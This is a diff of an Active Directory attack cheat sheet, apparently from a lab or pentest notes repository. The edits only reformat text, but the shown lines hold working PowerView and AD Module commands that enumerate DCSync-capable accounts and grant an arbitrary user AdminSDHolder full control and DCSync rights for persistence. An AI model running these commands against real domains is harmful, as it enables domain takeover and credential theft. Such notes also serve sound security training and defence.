@@ -394,7 +394,7 @@ DCSync:
 
 ```Get-DomainObjectAcl -DistinguishedName "dc=bcorp,dc=ecorp,dc=lab" -ResolveGUIDs | ? {($_.IdentityReference -match "Mary") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}```
 
-# PowerView tips on DomainObjectACL commands from Harmj0y:
+# PowerView tips on DomainObjectACL:
 #### retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
 ```Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}```
 
@@ -422,14 +422,15 @@ Get-DomainObjectAcl -Identity Josh -ResolveGUIDs | Foreach-Object {$_ | Add-Memb
 # Persistence Using ACLs - Rights Abuse
 #### AdminSDHolder 
 
-•  Add FullControl permissions ("GenericAll" rights) for an arbitrary user to AdminSDHolder 
+Add FullControl permissions ("GenericAll" rights) for an arbitrary user to AdminSDHolder 
 
 ```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Mary -Rights All -Verbose``` - PowerView
 
 ```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -Verbose``` - AD Module
 
 #### Domain Replication Privileges 
-•  Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) - https://adsecurity.org/?p=1729) for an arbitrary user 
+Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) for an arbitrary user 
+https://adsecurity.org/?p=1729
 
 ```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView
 
